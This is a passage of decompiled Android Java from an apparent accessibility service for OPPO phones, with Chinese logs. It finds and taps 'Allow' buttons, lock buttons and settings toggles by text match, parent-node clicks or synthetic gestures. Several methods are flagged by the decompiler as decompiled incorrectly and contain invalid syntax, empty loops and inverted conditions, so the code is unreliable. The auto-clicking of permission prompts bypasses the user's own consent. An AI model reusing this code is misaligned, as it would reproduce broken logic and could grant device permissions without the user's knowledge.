                    next.getBoundsInScreen(rect);
                    if (rect.width() > 0 && rect.height() > 0) {
                        float fCenterX = rect.centerX();
                        float fCenterY = rect.centerY();
                        m212303e0("[允许按钮]   手势点击坐标: (" + fCenterX + ", " + fCenterY + ")");
                        if (m212309a4(fCenterX, fCenterY)) {
                            m212303e0("[允许按钮] ✅ 手势点击[允许]成功!");
                            return true;
                        }
                    }
                }
                i2 = i3;
                it2 = it;
                z2 = false;
            } else {
                m212303e0("[允许按钮]   节点" + i2 + ": 不可见，跳过");
            }
            it = it2;
            i2 = i3;
            it2 = it;
            z2 = false;
        }
        m212303e0("[允许按钮] ❌ 未找到可点击的[允许]按钮");
        return false;
    }

    /* renamed from: a3 */
    public final boolean m212308a3(String str) {
        String string;
        String string2;
        Iterator it;
        String string3;
        String string4;
        String string5;
        String string6;
        String string7;
        m212303e0("[按钮点击] ========== 查找Button[" + str + "] ==========");
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = m212335d8();
        int i = 0;
        if (accessibilityNodeInfoM212335d8 == null) {
            m212303e0("[按钮点击] ❌ 获取root失败");
            return false;
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfoM212335d8.findAccessibilityNodeInfosByText(str);
        if (listFindAccessibilityNodeInfosByText == null) {
            AbstractC0003a2.m46c7("[按钮点击] ❌ 未找到包含[", str, "]的节点");
            return false;
        }
        m212303e0("[按钮点击] 找到" + listFindAccessibilityNodeInfosByText.size() + "个包含[" + str + "]的节点");
        ArrayList arrayList = new ArrayList();
        ArrayList arrayList2 = new ArrayList();
        Iterator<AccessibilityNodeInfo> it2 = listFindAccessibilityNodeInfosByText.iterator();
        while (true) {
            String str2 = "";
            if (!it2.hasNext()) {
                break;
            }
            AccessibilityNodeInfo next = it2.next();
            if (next.isVisibleToUser()) {
                CharSequence text = next.getText();
                if (text != null && (string6 = text.toString()) != null && (string7 = AbstractC0779a1.m213687e0(string6).toString()) != null) {
                    str2 = string7;
                }
                if (str2.equals(str)) {
                    arrayList.add(next);
                    m212303e0("[按钮点击]   精确匹配: '" + str2 + "'");
                } else {
                    arrayList2.add(next);
                    m212303e0("[按钮点击]   模糊匹配: '" + str2 + "'");
                }
            }
        }
        Iterator it3 = AbstractC0715je.m213298i5(arrayList, arrayList2).iterator();
        int i2 = 0;
        while (it3.hasNext()) {
            int i3 = i2 + 1;
            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) it3.next();
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className == null || (string = className.toString()) == null) {
                string = "";
            }
            String strM213684d7 = AbstractC0779a1.m213684d7(string, ".");
            CharSequence text2 = accessibilityNodeInfo.getText();
            if (text2 == null || (string5 = text2.toString()) == null || (string2 = AbstractC0779a1.m213687e0(string5).toString()) == null) {
                string2 = "";
            }
            m212303e0("[按钮点击]   节点" + i2 + ": text='" + string2 + "', class=" + strM213684d7);
            int i4 = (!AbstractC0779a1.m213652a5(string, "Button", true) || AbstractC0779a1.m213652a5(string, "Switch", true) || AbstractC0779a1.m213652a5(string, "CheckBox", true) || AbstractC0779a1.m213652a5(string, "Toggle", true) || AbstractC0779a1.m213652a5(string, "Radio", true)) ? i : 1;
            AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
            while (parent != null && i < 3) {
                CharSequence className2 = parent.getClassName();
                if (className2 == null || (string4 = className2.toString()) == null) {
                    string4 = "";
                }
                it = it3;
                if (AbstractC0779a1.m213652a5(string4, "Switch", true) || AbstractC0779a1.m213652a5(string4, "CheckBox", true) || AbstractC0779a1.m213652a5(string4, "Toggle", true)) {
                    m212303e0("[按钮点击]   节点" + i2 + ": 父节点是开关类型，跳过");
                    break;
                }
                parent = parent.getParent();
                i++;
                it3 = it;
            }
            it = it3;
            if (accessibilityNodeInfo.isClickable() && (i4 != 0 || AbstractC0779a1.m213652a5(string, "TextView", false))) {
                m212303e0("[按钮点击]   节点" + i2 + ": 是Button或TextView，尝试点击...");
                if (accessibilityNodeInfo.performAction(16)) {
                    m212303e0("[按钮点击] ✅ 点击Button[" + str + "]成功! (nodeText='" + string2 + "')");
                    return true;
                }
            }
            AccessibilityNodeInfo parent2 = accessibilityNodeInfo.getParent();
            for (int i5 = 0; parent2 != null && i5 < 3; i5++) {
                CharSequence className3 = parent2.getClassName();
                if (className3 == null || (string3 = className3.toString()) == null) {
                    string3 = "";
                }
                if (AbstractC0779a1.m213652a5(string3, "Switch", true) || AbstractC0779a1.m213652a5(string3, "CheckBox", true) || AbstractC0779a1.m213652a5(string3, "Toggle", true)) {
                    m212303e0("[按钮点击]   跳过开关类型父节点: ".concat(string3));
                    break;
                }
                if (parent2.isClickable()) {
                    m212303e0("[按钮点击]   尝试父节点(level=" + i5 + ")...");
                    if (parent2.performAction(16)) {
                        AbstractC0003a2.m46c7("[按钮点击] ✅ 点击Button[", str, "]父节点成功!");
                        return true;
                    }
                }
                parent2 = parent2.getParent();
            }
            i2 = i3;
            it3 = it;
            i = 0;
        }
        AbstractC0003a2.m46c7("[按钮点击] ❌ 未找到可点击的Button[", str, "]");
        return false;
    }

    /* renamed from: a4 */
    public final boolean m212309a4(float f, float f2) {
        try {
            m212303e0("[手势点击] 点击坐标(" + f + ", " + f2 + ")...");
            Path path = new Path();
            path.moveTo(f, f2);
            boolean zDispatchGesture = this.f55111a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 50L)).build(), null, null);
            if (zDispatchGesture) {
                m212303e0("[手势点击] ✅ 手势点击成功!");
                return zDispatchGesture;
            }
            m212303e0("[手势点击] ❌ 手势点击失败");
            return zDispatchGesture;
        } catch (Exception e) {
            m212303e0("[手势点击] ❌ 手势点击异常: " + e.getMessage());
            return false;
        }
    }

    /* renamed from: a5 */
    public final void m212310a5(float f, float f2) throws InterruptedException {
        Path path = new Path();
        path.moveTo(f, f2);
        GestureDescription gestureDescriptionBuild = new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L)).build();
        CountDownLatch countDownLatch = new CountDownLatch(1);
        this.f55111a0.dispatchGesture(gestureDescriptionBuild, new rl0(this, countDownLatch), null);
        try {
            countDownLatch.await(2000L, TimeUnit.MILLISECONDS);
        } catch (Exception unused) {
            m212303e0("[同步点击] ⚠️ 等待超时");
        }
    }

    /* renamed from: a6 */
    public final boolean m212311a6() {
        String string;
        String string2;
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = m212335d8();
        if (accessibilityNodeInfoM212335d8 != null) {
            for (String str : AbstractC0716jf.m213306g5("锁定", "鎖定", "加锁", "Lock", "LOCK", "잠금", "잠그기")) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfoM212335d8.findAccessibilityNodeInfosByText(str);
                m212303e0("[点击锁定] 查找'" + str + "': 找到 " + (listFindAccessibilityNodeInfosByText != null ? listFindAccessibilityNodeInfosByText.size() : 0) + " 个");
                if (listFindAccessibilityNodeInfosByText != null) {
                    for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                        CharSequence text = accessibilityNodeInfo.getText();
                        String str2 = "";
                        if (text == null || (string = text.toString()) == null) {
                            string = "";
                        }
                        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                        if (contentDescription != null && (string2 = contentDescription.toString()) != null) {
                            str2 = string2;
                        }
                        if (!(string.equals(str) || str2.equals(str) || t60.m214686a2(AbstractC0779a1.m213687e0(string).toString(), str) || t60.m214686a2(AbstractC0779a1.m213687e0(str2).toString(), str)) || AbstractC0779a1.m213652a5(string, "解", false) || AbstractC0779a1.m213652a5(string, "已", false) || AbstractC0779a1.m213652a5(str2, "解", false) || AbstractC0779a1.m213652a5(str2, "已", false)) {
                            accessibilityNodeInfo.recycle();
                        } else {
                            if (accessibilityNodeInfo.isVisibleToUser()) {
                                m212303e0("[点击锁定] ✅ 找到锁定按钮: text='" + string + "'");
                                Rect rect = new Rect();
                                accessibilityNodeInfo.getBoundsInScreen(rect);
                                m212309a4((float) rect.centerX(), (float) rect.centerY());
                                accessibilityNodeInfo.recycle();
                                return true;
                            }
                            accessibilityNodeInfo.recycle();
                        }
                    }
                }
            }
        }
        return false;
    }

    /* renamed from: a7 */
    public final boolean m212312a7(String str) {
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        Rect rect;
        String string;
        String string2;
        String string3;
        String string4;
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = m212335d8();
        if (accessibilityNodeInfoM212335d8 != null && (listFindAccessibilityNodeInfosByText = accessibilityNodeInfoM212335d8.findAccessibilityNodeInfosByText(str)) != null) {
            ArrayList arrayList = new ArrayList();
            ArrayList arrayList2 = new ArrayList();
            for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                if (accessibilityNodeInfo.isVisibleToUser()) {
                    CharSequence text = accessibilityNodeInfo.getText();
                    String str2 = "";
                    if (text == null || (string4 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string4).toString()) == null) {
                        string = "";
                    }
                    CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                    if (contentDescription != null && (string2 = contentDescription.toString()) != null && (string3 = AbstractC0779a1.m213687e0(string2).toString()) != null) {
                        str2 = string3;
                    }
                    String str3 = string.length() > 0 ? string : str2;
                    if (str3.equals(str) || string.equals(str) || str2.equals(str)) {
                        arrayList.add(accessibilityNodeInfo);
                    } else if (AbstractC0779a1.m213652a5(str3, str, false) || AbstractC0779a1.m213652a5(string, str, false) || AbstractC0779a1.m213652a5(str2, str, false)) {
                        arrayList2.add(accessibilityNodeInfo);
                    }
                }
            }
            ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(arrayList, arrayList2);
            int size = arrayListM213298i5.size();
            int i = 0;
            while (i < size) {
                Object obj = arrayListM213298i5.get(i);
                i++;
                AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
                if (accessibilityNodeInfo2.isClickable() && accessibilityNodeInfo2.performAction(16)) {
                    AbstractC0003a2.m46c7("[点击] ✅ [", str, "]");
                    return true;
                }
                AccessibilityNodeInfo parent = accessibilityNodeInfo2.getParent();
                for (int i2 = 0; parent != null && i2 < 5; i2++) {
                    if (parent.isClickable() && parent.performAction(16)) {
                        AbstractC0003a2.m46c7("[点击] ✅ [", str, "](父节点)");
                        return true;
                    }
                    parent = parent.getParent();
                }
                try {
                    rect = new Rect();
                    accessibilityNodeInfo2.getBoundsInScreen(rect);
                } catch (Exception unused) {
                }
                if (rect.width() > 0 && rect.height() > 0) {
                    float fCenterX = rect.centerX();
                    float fCenterY = rect.centerY();
                    Path path = new Path();
                    path.moveTo(fCenterX, fCenterY);
                    try {
                        this.f55111a0.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 0L, 100L)).build(), null, null);
                        m212303e0("[点击] ✅ [" + str + "](手势)");
                        return true;
                    } catch (Exception unused2) {
                        continue;
                    }
                }
            }
        }
        return false;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:103:0x0299 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:71:0x01c4  */
    /* JADX WARN: Removed duplicated region for block: B:84:0x028e  */
    /* JADX WARN: Removed duplicated region for block: B:88:0x029f  */
    /* JADX WARN: Type inference failed for: r13v3 */
    /* JADX WARN: Type inference failed for: r13v4, types: [int] */
    /* JADX WARN: Type inference failed for: r13v8 */
    /* JADX WARN: Type inference failed for: r14v0, types: [java.lang.StringBuilder] */
    /* JADX WARN: Type inference failed for: r1v7, types: [java.lang.StringBuilder] */
    /* JADX WARN: Type inference failed for: r7v4 */
    /* JADX WARN: Type inference failed for: r7v42 */
    /* JADX WARN: Type inference failed for: r7v5, types: [int] */
    /* renamed from: a8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m212313a8(String str) {
        AccessibilityNodeInfo parent;
        boolean z;
        Rect rect;
        boolean z2;
        boolean zM212309a4;
        String string;
        String string2;
        String string3;
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = m212335d8();
        boolean z3 = false;
        if (accessibilityNodeInfoM212335d8 == null) {
            m212303e0("[clickV] ❌ getRoot()返回null");
            return false;
        }
        List listM213677d0 = AbstractC0779a1.m213677d0(str, new String[]{"#"}, 6);
        ArrayList arrayList = new ArrayList(AbstractC0717jg.m213310g9(listM213677d0));
        Iterator it = listM213677d0.iterator();
        while (it.hasNext()) {
            arrayList.add(AbstractC0779a1.m213687e0((String) it.next()).toString());
        }
        ArrayList arrayList2 = new ArrayList();
        int size = arrayList.size();
        int i = 0;
        while (i < size) {
            Object obj = arrayList.get(i);
            i++;
            if (((String) obj).length() > 0) {
                arrayList2.add(obj);
            }
        }
        int size2 = arrayList2.size();
        int i2 = 0;
        while (i2 < size2) {
            Object obj2 = arrayList2.get(i2);
            i2++;
            String str2 = (String) obj2;
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfoM212335d8.findAccessibilityNodeInfosByText(str2);
            if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
                boolean z4 = z3;
                AbstractC0003a2.m46c7("[clickV] '", str2, "': findByText返回空");
                z3 = z4;
            } else {
                m212303e0("[clickV] '" + str2 + "': 找到" + listFindAccessibilityNodeInfosByText.size() + "个节点");
                ?? r7 = z3;
                for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                    int i3 = r7 + 1;
                    CharSequence text = accessibilityNodeInfo.getText();
                    String string4 = text != null ? text.toString() : null;
                    CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
                    String string5 = contentDescription != null ? contentDescription.toString() : null;
                    CharSequence className = accessibilityNodeInfo.getClassName();
                    String string6 = "?";
                    m212303e0("[clickV]   节点" + r7 + ": text='" + string4 + "', desc='" + string5 + "', class=" + ((className == null || (string3 = className.toString()) == null) ? "?" : AbstractC0779a1.m213684d7(string3, ".")));
                    if (string4 == null) {
                        m212303e0("[clickV]   ❌ text为null，跳过");
                    } else if (string4.equals(str2)) {
                        CharSequence className2 = accessibilityNodeInfo.getClassName();
                        if (className2 == null || (string2 = className2.toString()) == null || !AbstractC0779a1.m213655a8(string2, z3, "AutoCompleteTextView")) {
                            m212303e0("[clickV]   ✓ 匹配成功，调用x()...");
                            CharSequence text2 = accessibilityNodeInfo.getText();
                            if (text2 == null || (string = text2.toString()) == null) {
                                CharSequence contentDescription2 = accessibilityNodeInfo.getContentDescription();
                                if (contentDescription2 != null) {
                                    string6 = contentDescription2.toString();
                                }
                            } else {
                                string6 = string;
                            }
                            m212303e0("[x()] 开始点击节点: '" + string6 + "', isClickable=" + accessibilityNodeInfo.isClickable());
                            if (accessibilityNodeInfo.isClickable()) {
                                m212303e0("[x()] 策略1: 节点可点击，尝试ACTION_CLICK");
                                if (accessibilityNodeInfo.performAction(16)) {
                                    m212303e0("[x()] ✅ 策略1成功");
                                    z = z3;
                                    z2 = true;
                                    zM212309a4 = true;
                                    if (zM212309a4) {
                                        AbstractC0003a2.m46c7("[v] [", str2, "]");
                                        return z2;
                                    }
                                    m212303e0("[clickV]   ❌ x()返回false");
                                } else {
                                    m212303e0("[x()] ❌ 策略1失败");
                                    parent = accessibilityNodeInfo.getParent();
                                    ?? r13 = z3;
                                    while (parent != null) {
                                        int i4 = r13 + 1;
                                        if (parent.isClickable()) {
                                            z = z3;
                                            m212303e0("[x()] 策略2: 找到可点击父节点(level=" + i4 + ")");
                                            if (parent.performAction(16)) {
                                                m212303e0("[x()] ✅ 策略2成功");
                                                z2 = true;
                                                zM212309a4 = true;
                                                break;
                                            }
                                            m212303e0("[x()] ❌ 策略2失败");
                                        } else {
                                            z = z3;
                                        }
                                        parent = parent.getParent();
                                        z3 = z;
                                        r13 = i4;
                                    }
                                    z = z3;
                                    m212303e0("[x()] 策略2: 遍历" + r13 + "层父节点，未找到可点击的");
                                    rect = new Rect();
                                    accessibilityNodeInfo.getBoundsInScreen(rect);
                                    int i5 = rect.left;
                                    int i6 = rect.top;
                                    int i7 = rect.right;
                                    int i8 = rect.bottom;
                                    z2 = true;
                                    StringBuilder sbM38b9 = AbstractC0003a2.m38b9("[x()] 策略3: 节点坐标rect=[", i5, ",", i6, ",");
                                    sbM38b9.append(i7);
                                    sbM38b9.append(",");
                                    sbM38b9.append(i8);
                                    sbM38b9.append("]");
                                    m212303e0(sbM38b9.toString());
                                    if (rect.width() > 0 || rect.height() <= 0) {
                                        m212303e0("[x()] ❌ 所有策略都失败了");
                                        zM212309a4 = z;
                                    } else {
                                        float fCenterX = rect.centerX();
                                        float fCenterY = rect.centerY();
                                        m212303e0("[x()] 策略3: 手势点击中心坐标(" + fCenterX + ", " + fCenterY + ")");
                                        zM212309a4 = m212309a4(fCenterX, fCenterY);
                                        StringBuilder sb = new StringBuilder("[x()] 策略3结果: ");
                                        sb.append(zM212309a4);
                                        m212303e0(sb.toString());
                                    }
                                    if (zM212309a4) {
                                    }
                                }
                            } else {
                                parent = accessibilityNodeInfo.getParent();
                                ?? r132 = z3;
                                while (parent != null) {
                                }
                                z = z3;
                                m212303e0("[x()] 策略2: 遍历" + r132 + "层父节点，未找到可点击的");
                                rect = new Rect();
                                accessibilityNodeInfo.getBoundsInScreen(rect);
                                int i52 = rect.left;
                                int i62 = rect.top;
                                int i72 = rect.right;
                                int i82 = rect.bottom;
                                z2 = true;
                                StringBuilder sbM38b92 = AbstractC0003a2.m38b9("[x()] 策略3: 节点坐标rect=[", i52, ",", i62, ",");
                                sbM38b92.append(i72);
                                sbM38b92.append(",");
                                sbM38b92.append(i82);
                                sbM38b92.append("]");
                                m212303e0(sbM38b92.toString());
                                if (rect.width() > 0) {
                                    m212303e0("[x()] ❌ 所有策略都失败了");
                                    zM212309a4 = z;
                                    if (zM212309a4) {
                                    }
                                }
                            }
                            r7 = i3;
                            z3 = z;
                        } else {
                            m212303e0("[clickV]   ❌ 是AutoCompleteTextView，跳过");
                        }
                    } else {
                        m212303e0("[clickV]   ❌ text='" + string4 + "' != '" + str2 + "'，跳过");
                    }
                    z = z3;
                    r7 = i3;
                    z3 = z;
                }
            }
        }
        boolean z5 = z3;
        m212303e0("[clickV] ❌ 所有尝试都失败");
        return z5;
    }

    /* JADX WARN: Removed duplicated region for block: B:24:0x005a  */
    /* JADX WARN: Removed duplicated region for block: B:29:0x0076  */
    /* JADX WARN: Removed duplicated region for block: B:31:0x0079  */
    /* JADX WARN: Removed duplicated region for block: B:32:0x007b  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:25:0x006d -> B:27:0x0070). Please report as a decompilation issue!!! */
    /* renamed from: a9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212314a9(String str, int i, ContinuationImpl continuationImpl) throws Throwable {
        OppoStepsSimplified$clickVWithScroll$1 oppoStepsSimplified$clickVWithScroll$1;
        long j;
        String str2;
        int i2;
        int i3;
        C0368a5 c0368a5;
        if (continuationImpl instanceof OppoStepsSimplified$clickVWithScroll$1) {
            oppoStepsSimplified$clickVWithScroll$1 = (OppoStepsSimplified$clickVWithScroll$1) continuationImpl;
            int i4 = oppoStepsSimplified$clickVWithScroll$1.f54532a7;
            if ((i4 & Integer.MIN_VALUE) != 0) {
                oppoStepsSimplified$clickVWithScroll$1.f54532a7 = i4 - Integer.MIN_VALUE;
            } else {
                oppoStepsSimplified$clickVWithScroll$1 = new OppoStepsSimplified$clickVWithScroll$1(this, continuationImpl);
            }
        }
        Object obj = oppoStepsSimplified$clickVWithScroll$1.f54530a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i5 = oppoStepsSimplified$clickVWithScroll$1.f54532a7;
        if (i5 == 0) {
            kg1.m213544f4(obj);
            if (m212313a8(str)) {
                return Boolean.TRUE;
            }
            j = Build.VERSION.SDK_INT >= 36 ? 200L : 50L;
            str2 = str;
            i2 = 0;
            i3 = i;
            c0368a5 = this;
            if (i2 < i3) {
            }
        } else {
            if (i5 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i2 = oppoStepsSimplified$clickVWithScroll$1.f54528a3;
            j = oppoStepsSimplified$clickVWithScroll$1.f54529a4;
            int i6 = oppoStepsSimplified$clickVWithScroll$1.f54527a2;
            String str3 = oppoStepsSimplified$clickVWithScroll$1.f54526a1;
            c0368a5 = oppoStepsSimplified$clickVWithScroll$1.f54525a0;
            kg1.m213544f4(obj);
            i3 = i6;
            str2 = str3;
            if (!c0368a5.m212313a8(str2)) {
                return Boolean.TRUE;
            }
            i2++;
            if (i2 < i3) {
                return Boolean.FALSE;
            }
            c0368a5.m212349f4();
            oppoStepsSimplified$clickVWithScroll$1.f54525a0 = c0368a5;
            oppoStepsSimplified$clickVWithScroll$1.f54526a1 = str2;
            oppoStepsSimplified$clickVWithScroll$1.f54527a2 = i3;
            oppoStepsSimplified$clickVWithScroll$1.f54529a4 = j;
            oppoStepsSimplified$clickVWithScroll$1.f54528a3 = i2;
            oppoStepsSimplified$clickVWithScroll$1.f54532a7 = 1;
            if (c0368a5.m212354f9(j, oppoStepsSimplified$clickVWithScroll$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
            if (!c0368a5.m212313a8(str2)) {
            }
        }
    }

    /* renamed from: b2 */
    public final boolean m212315b2(String str) {
        String string;
        String string2;
        String string3;
        m212303e0("[开关-关闭] ========== 查找开关[" + str + "] ==========");
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = m212335d8();
        if (accessibilityNodeInfoM212335d8 == null) {
            m212303e0("[开关-关闭] ❌ 获取root失败");
            return false;
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfoM212335d8.findAccessibilityNodeInfosByText(str);
        m212303e0("[开关-关闭] 找到" + (listFindAccessibilityNodeInfosByText != null ? listFindAccessibilityNodeInfosByText.size() : 0) + "个包含[" + str + "]的节点");
        if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
            AbstractC0003a2.m46c7("[开关-关闭] ❌ 未找到开关[", str, "]");
            return false;
        }
        int i = 0;
        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
            int i2 = i + 1;
            if (accessibilityNodeInfo.isVisibleToUser()) {
                CharSequence text = accessibilityNodeInfo.getText();
                if (text == null || (string3 = text.toString()) == null || (string = AbstractC0779a1.m213687e0(string3).toString()) == null) {
                    string = "";
                }
                m212303e0("[开关-关闭]   节点" + i + ": text='" + string + "'");
                if (string.equals(str) || AbstractC0779a1.m213652a5(string, str, false)) {
                    m212303e0("[开关-关闭]   节点" + i + ": ✓ " + (string.equals(str) ? "精确" : "包含") + "匹配'" + str + "'");
                    AccessibilityNodeInfo parent = accessibilityNodeInfo;
                    for (int i3 = 0; parent != null && i3 < 8; i3++) {
                        m212303e0("[开关-关闭]   节点" + i + ": 在层级" + i3 + " 查找开关组件...");
                        AccessibilityNodeInfo accessibilityNodeInfoM212301d5 = m212301d5(parent);
                        if (accessibilityNodeInfoM212301d5 != null) {
                            CharSequence className = accessibilityNodeInfoM212301d5.getClassName();
                            String strM213684d7 = (className == null || (string2 = className.toString()) == null) ? "unknown" : AbstractC0779a1.m213684d7(string2, ".");
                            boolean zIsChecked = accessibilityNodeInfoM212301d5.isChecked();
                            m212303e0("[开关-关闭]   找到开关(层级" + i3 + "): class=" + strM213684d7 + ", isChecked=" + zIsChecked);
                            if (!zIsChecked) {
                                AbstractC0003a2.m46c7("[开关-关闭] ✅ [", str, "]已关闭，无需操作");
                                return true;
                            }
                            m212303e0("[开关-关闭]   尝试关闭开关...");
                            m212303e0("[开关-关闭]   策略1: 直接点击开关...");
                            boolean zPerformAction = accessibilityNodeInfoM212301d5.performAction(16);
                            m212303e0("[开关-关闭]   策略1: 结果=" + zPerformAction);
                            if (zPerformAction) {
                                m212303e0("[开关-关闭] ✅ 策略1成功: 直接点击关闭!");
                                return true;
                            }
                            m212303e0("[开关-关闭]   策略2: 点击开关父节点...");
                            AccessibilityNodeInfo parent2 = accessibilityNodeInfoM212301d5.getParent();
                            if (parent2 != null && parent2.isClickable()) {
                                boolean zPerformAction2 = parent2.performAction(16);
                                m212303e0("[开关-关闭]   策略2: 结果=" + zPerformAction2);
                                if (zPerformAction2) {
                                    m212303e0("[开关-关闭] ✅ 策略2成功: 开关父节点点击关闭!");
                                    return true;
                                }
                            }
                            m212303e0("[开关-关闭]   策略3: 点击整行...");
                            AccessibilityNodeInfo parent3 = accessibilityNodeInfo.getParent();
                            for (int i4 = 0; parent3 != null && i4 < 5; i4++) {
                                if (parent3.isClickable()) {
                                    boolean zPerformAction3 = parent3.performAction(16);
                                    m212303e0("[开关-关闭]   策略3(level=" + i4 + "): 结果=" + zPerformAction3);
                                    if (zPerformAction3) {
                                        m212303e0("[开关-关闭] ✅ 策略3成功: 整行点击关闭(level=" + i4 + ")!");
                                        return true;
                                    }
                                }
                                parent3 = parent3.getParent();
                            }
                            m212303e0("[开关-关闭]   策略4: 手势点击...");
                            Rect rect = new Rect();
                            accessibilityNodeInfoM212301d5.getBoundsInScreen(rect);
                            if (rect.width() > 0 && rect.height() > 0) {
                                float fCenterX = rect.centerX();
                                float fCenterY = rect.centerY();
                                m212303e0("[开关-关闭]   手势点击坐标: (" + fCenterX + ", " + fCenterY + ")");
                                boolean zM212309a4 = m212309a4(fCenterX, fCenterY);
                                StringBuilder sb = new StringBuilder("[开关-关闭]   策略4: 结果=");
                                sb.append(zM212309a4);
                                m212303e0(sb.toString());
                                if (zM212309a4) {
                                    m212303e0("[开关-关闭] ✅ 策略4成功: 手势点击关闭!");
                                    return true;
                                }
                            }
                            m212303e0("[开关-关闭] ⚠️ 所有策略都尝试过了，返回true让流程继续");
                            return true;
                        }
                        parent = parent.getParent();
                    }
                    m212303e0("[开关-关闭]   节点" + i + ": 向上8层都未找到开关组件");
                } else {
                    m212303e0("[开关-关闭]   节点" + i + ": 跳过不匹配 '" + string + "'");
                }
            } else {
                m212303e0("[开关-关闭]   节点" + i + ": 不可见，跳过");
            }
            i = i2;
        }
        AbstractC0003a2.m46c7("[开关-关闭] ❌ 所有节点都未找到开关，未能关闭[", str, "]");
        return false;
    }

    /* renamed from: b3 */
    public final void m212316b3(String str) {
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = m212335d8();
        if (accessibilityNodeInfoM212335d8 == null) {
            AbstractC0003a2.m46c7("[DUMP] ❌ ", str, " - 无法获取根节点");
            return;
        }
        ArrayList arrayList = new ArrayList();
        m212297b4(accessibilityNodeInfoM212335d8, arrayList);
        m212303e0("[DUMP] ===== " + str + " (" + arrayList.size() + "个文本) =====");
        int size = arrayList.size();
        int i = 0;
        int i2 = 0;
        while (i2 < size) {
            Object obj = arrayList.get(i2);
            i2++;
            int i3 = i + 1;
            if (i < 0) {
                AbstractC0716jf.m213309g8();
                throw null;
            }
            m212303e0("[DUMP] " + i + ": " + ((String) obj));
            i = i3;
        }
        AbstractC0003a2.m46c7("[DUMP] ===== END ", str, " =====");
    }

    /* renamed from: b5 */
    public final void m212317b5(String str) {
        AccessibilityNodeInfo accessibilityNodeInfoM212335d8 = m212335d8();
        if (accessibilityNodeInfoM212335d8 == null) {
            return;
        }
        ArrayList arrayList = new ArrayList();
        m212295b0(accessibilityNodeInfoM212335d8, arrayList);
        m212303e0("=== " + str + " ===");
        int i = 0;
        for (Object obj : AbstractC0715je.m213301i8(arrayList, 15)) {
            int i2 = i + 1;
            if (i < 0) {
                AbstractC0716jf.m213309g8();
                throw null;
            }
            m212303e0("  [" + i + "] " + ((String) obj));
            i = i2;
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(10:155|(1:266)|156|157|272|158|159|261|160|(20:163|268|164|165|166|(1:168)|270|169|(13:263|171|(0)|179|180|274|181|(4:186|187|153|(3:206|207|(4:210|(2:211|(2:213|(2:280|215)(1:281))(1:279))|216|(4:219|220|222|(5:225|226|(2:227|(2:229|(2:277|231)(1:278))(1:276))|232|(2:235|(3:14|238|(7:241|242|(0)(0)|(0)(0)|(3:(0)(0)|(0)(0)|258)(0)|259|260)))))))(0))|190|(1:192)(1:193)|194|207|(0))|178|179|180|274|181|(5:183|186|187|153|(0)(0))|190|(0)(0)|194|207|(0))) */
    /* JADX WARN: Can't wrap try/catch for region: R(10:155|266|156|157|272|158|159|261|160|(20:163|268|164|165|166|(1:168)|270|169|(13:263|171|(0)|179|180|274|181|(4:186|187|153|(3:206|207|(4:210|(2:211|(2:213|(2:280|215)(1:281))(1:279))|216|(4:219|220|222|(5:225|226|(2:227|(2:229|(2:277|231)(1:278))(1:276))|232|(2:235|(3:14|238|(7:241|242|(0)(0)|(0)(0)|(3:(0)(0)|(0)(0)|258)(0)|259|260)))))))(0))|190|(1:192)(1:193)|194|207|(0))|178|179|180|274|181|(5:183|186|187|153|(0)(0))|190|(0)(0)|194|207|(0))) */
